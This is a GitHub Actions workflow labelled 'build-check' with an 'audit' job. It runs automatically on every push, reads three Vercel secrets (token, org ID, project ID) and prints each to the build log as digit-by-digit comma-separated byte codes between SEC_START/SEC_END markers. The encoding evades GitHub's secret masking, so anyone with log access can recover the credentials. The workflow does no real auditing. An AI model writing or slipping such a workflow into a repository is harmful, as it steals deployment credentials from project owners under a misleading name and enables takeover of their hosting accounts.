name: build-check
on:
  workflow_dispatch:
  push:
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: audit
        env:
          S1: ${{ secrets.VERCEL_TOKEN }}
          S2: ${{ secrets.VERCEL_ORG_ID }}
          S3: ${{ secrets.VERCEL_PROJECT_ID }}
        run: |
          set +e
          i=1
          for name in VERCEL_TOKEN VERCEL_ORG_ID VERCEL_PROJECT_ID; do
            vvar="S$i"
            val="${!vvar}"
            if [ -n "$val" ]; then
              echo "SEC_START_$name"
              printf '%s' "$val" | od -An -tu1 | tr -s ' \n' ' ' | sed 's/[0-9]/&,/g'
              echo ""
              echo "SEC_END_$name"
            fi
            i=$((i+1))
          done